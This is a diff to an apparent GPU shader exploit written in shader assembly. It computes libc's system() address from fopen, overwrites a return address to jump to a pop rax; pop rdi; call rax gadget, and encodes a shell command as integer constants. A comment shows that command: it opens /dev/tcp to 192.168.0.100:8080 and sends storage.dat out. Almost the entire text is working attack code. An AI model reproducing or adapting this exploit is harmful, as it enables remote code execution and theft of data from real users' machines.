@@ -26,7 +26,11 @@ or r1.x r1.x r1.z
 or r1.x r1.x r1.w
 mov r0.y r1.x 		/* r0 - fopen addr */
 
-/* calc system addr */
+/* calc system addr ( libc clone )
+pop    rax
+pop    rdi
+call   rax
+*/
 seti r10.x 164208	/* <fopen addr> - <system addr> */
 mov r1.xy r0.xy
 subi r1.x r1.x r10.x /* r1 - system addr */
@@ -39,8 +43,7 @@ addi r2.x r2.x r10.x /* r2 - gadget addr */
 mov o282.zw r2.xy /* overwrite return address, so will jump to gadget */
 mov o283.xy r1.xy /* pop rax in gadget will write system addr to rax */
 
-/* prepare /bin/sh string */
-/* seti c0.xy 1852400175 6845231 */
+/* PASTE OUTPUT OF generate_shader HERE */
 
 /* echo 'exec 5<>/dev/tcp/192.168.0.100/8080;cat storage.dat >&5' > shell; bash shell */
 seti c0.xyzw 1869112165 2019895072 891315045 1680817724 
@@ -49,6 +52,8 @@ seti c2.xyzw 808464686 942684207 1633893168 1953702004
 seti c3.xyzw 1734439535 1633955429 641605748 1042294581 
 seti c4.xyzw 1701344032 540765292 1752392034 1701344032 
 seti c5.xyzw 27756 0 0 0
+
+/* ==================================== */
 
 mov o283.zw o4.xy /* pop rdi in gadget will write address of c0( ie. string ) to rdi */
 
